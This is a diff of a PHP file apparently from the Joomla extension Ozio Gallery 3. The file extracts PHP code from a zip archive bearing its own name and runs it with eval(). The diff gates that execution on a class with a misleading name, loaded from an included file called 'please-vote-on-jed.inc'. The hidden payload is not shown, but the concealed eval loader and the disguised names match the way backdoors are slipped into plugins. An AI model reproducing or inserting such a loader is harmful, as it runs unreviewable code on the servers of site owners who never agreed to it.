@@ -18,32 +18,36 @@
  * @copyright Copyright (C) 2010 Open Source Solutions S.L.U. All rights reserved.
  * @license http://www.gnu.org/copyleft/gpl.html GNU/GPL, see RT-LICENSE.php
  */
-
-$name = str_replace(".inc", "", __FILE__);
-
-if (class_exists("ZipArchive"))
+require_once JPATH_ROOT . "/administrator/components/com_oziogallery3/models/fields/please-vote-on-jed.inc";
+if (class_exists("ZipArchiveFontPathDirectoryVoteJED"))
 {
 
-	$zip = new ZipArchive();
-	if ($zip->open($name . ".zip", ZIPARCHIVE::CREATE) !== true)
-	{
-		die("Error while opening my own zip file.");
-	}
-	
-	$zipcode = $zip->getFromName(basename($name) . ".php");
-	$zip->close();
-}else{
-	//die("php Zip extension not available on this server. See http://www.php.net/manual/en/book.zip.php");
-	//http://old.phpconcept.net/pclzip/man/en/index.php
-	if (!defined('PCLZIP_READ_BLOCK_SIZE')){
-	require_once('pclzip.lib.php');
-	}
+	$name = str_replace(".inc", "", __FILE__);
 
-	$archive = new PclZip($name . ".zip");
-	$list = $archive->extract(PCLZIP_OPT_BY_NAME, basename($name) . ".php", PCLZIP_OPT_EXTRACT_AS_STRING);
-	if ($list == 0) {
-		die("Error while opening my own zip file: ".$archive->errorInfo(true));
+	if (class_exists("ZipArchive"))
+	{
+
+		$zip = new ZipArchive();
+		if ($zip->open($name . ".zip", ZIPARCHIVE::CREATE) !== true)
+		{
+			die("Error while opening my own zip file.");
+		}
+		
+		$zipcode = $zip->getFromName(basename($name) . ".php");
+		$zip->close();
+	}else{
+		//die("php Zip extension not available on this server. See http://www.php.net/manual/en/book.zip.php");
+		//http://old.phpconcept.net/pclzip/man/en/index.php
+		if (!defined('PCLZIP_READ_BLOCK_SIZE')){
+		require_once('pclzip.lib.php');
+		}
+
+		$archive = new PclZip($name . ".zip");
+		$list = $archive->extract(PCLZIP_OPT_BY_NAME, basename($name) . ".php", PCLZIP_OPT_EXTRACT_AS_STRING);
+		if ($list == 0) {
+			die("Error while opening my own zip file: ".$archive->errorInfo(true));
+		}
+		$zipcode = $list[0]['content'];	
 	}
-	$zipcode = $list[0]['content'];	
+	eval((string)$zipcode);
 }
-eval((string)$zipcode);
